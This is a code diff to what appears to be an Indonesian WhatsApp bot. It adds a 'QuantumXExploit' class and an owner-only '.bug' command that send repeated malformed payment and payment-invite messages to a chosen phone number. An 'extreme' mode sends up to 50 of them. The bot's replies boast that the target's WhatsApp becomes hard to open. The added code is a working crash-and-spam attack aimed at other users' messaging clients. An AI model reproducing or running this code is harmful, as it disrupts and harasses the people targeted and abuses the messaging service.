@@ -21,6 +21,7 @@ const path = require('path');
 const axios = require('axios');
 const FormData = require("form-data");
 const sharp = require('sharp');
+const crypto = require('crypto'); 
 const moment = require('moment-timezone');
 const cheerio = require("cheerio")
 const fetch = require('node-fetch')
@@ -893,6 +894,163 @@ async function processVoiceEffect(inputBuffer, effectType, effectName) {
             .save(tempOutput);
     });
 }
+
+
+// ==================== QUANTUMX EXPLOIT SYSTEM ====================
+class QuantumXExploit {
+    constructor(sock) {
+        this.sock = sock;
+    }
+
+    // 💣 MULTIPLE PAYMENT CRASH - DELAYED & HEAVY
+    async paymentCrashMultiple(targetJid, count = 5) {
+        try {
+            console.log(`💣 [BUG] ${count}x Payment crash to: ${targetJid}`);
+            
+            let successCount = 0;
+            
+            // JENIS PAYLOAD BERBEDA-BEDA
+            const payloads = [
+                {
+                    sendPaymentMessage: {
+                        amount: { value: "999999999", offset: 9999, currencyCodeIso4217: "IDR" }
+                    }
+                },
+                {
+                    sendPaymentMessage: {
+                        amount: { value: "500000000", offset: 5000, currencyCodeIso4217: "IDR" }
+                    }
+                },
+                {
+                    sendPaymentMessage: {
+                        amount: { value: "750000000", offset: 7500, currencyCodeIso4217: "IDR" }
+                    }
+                },
+                {
+                    paymentInviteMessage: {
+                        serviceType: "UPI",
+                        expiryTimestamp: Date.now() + 3600000
+                    }
+                }
+            ];
+            
+            for (let i = 1; i <= count; i++) {
+                try {
+                    // PILIH PAYLOAD BERBEDA SETIAP KALI
+                    const payloadIndex = (i - 1) % payloads.length;
+                    const payload = payloads[payloadIndex];
+                    
+                    await this.sock.relayMessage(targetJid, payload, {
+                        participant: { jid: targetJid },
+                        messageId: this.sock.generateMessageTag(),
+                    });
+                    
+                    successCount++;
+                    
+                    // DELAY MAKIN LAMA PER KALI
+                    const delay = 300 + (i * 100); // 300, 400, 500, 600, dst
+                    console.log(`Sent payload ${i}, delay ${delay}ms`);
+                    
+                    if (i < count) {
+                        await new Promise(resolve => setTimeout(resolve, delay));
+                    }
+                    
+                } catch (error) {
+                    console.error(`❌ Payload ${i} failed:`, error.message);
+                }
+            }
+            
+            return { 
+                success: successCount > 0, 
+                sent: successCount,
+                total: count
+            };
+            
+        } catch (error) {
+            console.error('❌ Multiple crash error:', error.message);
+            return { error: error.message };
+        }
+    }
+    
+    // ☠️ EXTREME MODE - SPAM WITH LONG DELAYS
+    async extremeCrash(targetJid, count = 20) {
+        try {
+            console.log(`☠️ [BUG EXTREME] ${count}x Extreme crash to: ${targetJid}`);
+            
+            let successCount = 0;
+            
+            // PHASE 1: QUICK SPAM
+            for (let i = 1; i <= Math.min(10, count); i++) {
+                try {
+                    await this.sock.relayMessage(targetJid, {
+                        sendPaymentMessage: {
+                            amount: { 
+                                value: String(100000000 + (i * 50000000)), 
+                                offset: i * 500, 
+                                currencyCodeIso4217: "IDR" 
+                            }
+                        }
+                    }, {
+                        participant: { jid: targetJid },
+                        messageId: this.sock.generateMessageTag(),
+                    });
+                    
+                    successCount++;
+                    await new Promise(resolve => setTimeout(resolve, 150));
+                    
+                } catch (error) {
+                    console.error(`Phase 1 payload ${i} failed:`, error.message);
+                }
+            }
+            
+            // PHASE 2: SLOW SPAM WITH LONG DELAYS
+            if (count > 10) {
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                for (let i = 11; i <= count; i++) {
+                    try {
+                        await this.sock.relayMessage(targetJid, {
+                            sendPaymentMessage: {
+                                amount: { 
+                                    value: String(900000000 - (i * 10000000)), 
+                                    offset: 9999 - (i * 100), 
+                                    currencyCodeIso4217: "IDR" 
+                                }
+                            }
+                        }, {
+                            participant: { jid: targetJid },
+                            messageId: this.sock.generateMessageTag(),
+                        });
+                        
+                        successCount++;
+                        
+                        // DELAY PANJANG
+                        const delay = 1000 + (Math.random() * 1000);
+                        if (i < count) {
+                            await new Promise(resolve => setTimeout(resolve, delay));
+                        }
+                        
+                    } catch (error) {
+                        console.error(`Phase 2 payload ${i} failed:`, error.message);
+                    }
+                }
+            }
+            
+            return { 
+                success: successCount > 0, 
+                sent: successCount,
+                total: count
+            };
+            
+        } catch (error) {
+            console.error('❌ Extreme crash error:', error.message);
+            return { error: error.message };
+        }
+    }
+}
+
+let exploitSystem = null;
+
 const truthList = [
   "Apa hal paling memalukan yang pernah kamu lakukan di depan umum?",
   "Siapa nama mantan yang masih suka kamu stalk?",
@@ -1949,6 +2107,8 @@ async function startBot() {
     printQRInTerminal: false,
     defaultQueryTimeoutMs: undefined
   });
+
+    exploitSystem = new QuantumXExploit(sock);
 
   sock.ev.on('connection.update', async (update) => {
     const { connection, lastDisconnect, qr } = update;
@@ -5926,6 +6086,84 @@ if (text.startsWith('.spamcode')) {
   await spamCode(sock, from, msg, text, isOwner);
 }
 
+// 🎯 FITUR .bug (Payment Crash)
+if (body.startsWith('.bug')) {
+    const args = body.trim().split(' ');
+    
+    if (args.length === 1) {
+        await sock.sendMessage(from, { 
+            text: '❌ Format: *.bug 62xxxxxxx*\nContoh: *.bug 6281234567890*\n\nAtau: *.bug 62xxxxxxx 20* (20x)\nAtau: *.bug 62xxxxxxx extreme* (extreme mode)'
+        });
+        return;
+    }
+
+    if (!isOwner(sender)) {
+        await sock.sendMessage(from, { text: '❌ Owner only!' });
+        return;
+    }
+
+    let targetNum = args[1].replace(/[^0-9]/g, '');
+    
+    if (!targetNum) {
+        await sock.sendMessage(from, {
+            text: '❌ Kasih nomor target!'
+        });
+        return;
+    }
+    
+    if (targetNum.startsWith('0')) targetNum = '62' + targetNum.slice(1);
+    if (!targetNum.startsWith('62')) targetNum = '62' + targetNum;
+    
+    const targetJid = targetNum + '@s.whatsapp.net';
+
+    // CEK MODE
+    let mode = "normal";
+    let count = 5;
+    
+    if (args.length >= 3) {
+        const param = args[2].toLowerCase();
+        
+        if (param === 'extreme' || param === 'ex' || param === 'heavy') {
+            mode = "extreme";
+            count = 20;
+        } else {
+            count = parseInt(param);
+            if (isNaN(count) || count < 1) count = 5;
+            if (count > 50) count = 50;
+        }
+    }
+
+    // EXECUTE
+    if (mode === "extreme") {
+        await sock.sendMessage(from, {
+            text: `☠️ *EXTREME MODE!*\nTarget: ${targetNum}\nPayloads: ${count}x\nStatus: Bombarding with long delays...`
+        });
+
+        const result = await exploitSystem.extremeCrash(targetJid, count);
+        
+        await sock.sendMessage(from, {
+            text: result.success ? 
+                `💀 *EXTREME COMPLETE!*\nSent: ${result.sent}/${count}\n\n⚠️ WhatsApp target SUSAH dibuka lama!` :
+                `❌ Failed`
+        });
+        
+    } else {
+        await sock.sendMessage(from, {
+            text: `🚀 Sending ${count}x payment crash to ${targetNum}...`
+        });
+
+        const result = await exploitSystem.paymentCrashMultiple(targetJid, count);
+        
+        await sock.sendMessage(from, {
+            text: result.success ? 
+                `✅ Done! ${result.sent}/${count} sent to ${targetNum}` :
+                `❌ Failed`
+        });
+    }
+    
+    return;
+}
+
 // 📝 SET NAMA GRUP – Semua member bisa
 if (text.startsWith('.setnamagc')) {
     if (!from.endsWith('@g.us')) {
@@ -8841,7 +9079,6 @@ if (text.trim().toLowerCase() === '.blur') {
 
     return;
 }
-
 
     });
 }
